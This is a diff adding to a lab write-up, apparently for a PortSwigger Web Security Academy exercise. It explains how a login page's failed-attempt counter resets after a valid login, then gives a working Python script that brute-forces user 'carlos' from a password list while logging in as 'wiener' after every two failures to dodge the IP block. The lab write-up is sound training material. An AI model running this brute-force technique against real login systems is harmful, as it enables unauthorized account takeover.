@@ -36,4 +36,64 @@ So now the logic behind this login function is that:
 - After two failed login we get incorrect password as expected
 - Then the third login when tried with a valid cred works which prevents the the web app from blocking our IP
 
+Cool with this we know that we can brute force the user's password for every two requests made and the third request we will login as weiner
+
+I made a script for that though *Portswigger* recommended a burp extension
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2392dd57-3372-4b21-8781-612ee1ef8f79)
+
+Here's my script 
+
+```python
+#!/usr/bin/python3
+import requests
+import time
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+with open('passwords.txt', 'r') as f:
+    passwords = [passwd.strip() for passwd in f.readlines()]
+
+url = 'https://0a42008903a8b19183b582120062005e.web-security-academy.net/login'
+
+data = {
+    'username': 'carlos',
+    'password': ''
+}
+
+valid_cred = {
+    'username': 'wiener',
+    'password': 'peter'
+}
+
+# Make a valid request to prevent IP Block
+req = requests.post(url, data=valid_cred, verify=False, allow_redirects=True)
+
+count = 0
+
+for password in passwords:
+    data['password'] = password
+    req = requests.post(url, data=data, verify=False)
+
+    if 'Incorrect password' not in req.text:
+        print(f'Password found: {password}')
+        break
+
+    count += 1
+
+    # On every 3rd request bypass IP blocker by logging in with valid cred
+    if count == 2:
+        print(f'Trying: {password}')
+        req = requests.post(url, data=valid_cred, verify=False)
+
+        count = 0
+```
+
+Running it gives the password
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a37c4341-dd38-491a-a0a1-bf0c83de5afd)
+
+And automatically it shows solved
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/38123a6b-bac9-492a-b674-a3f050160a32)
+
+
 
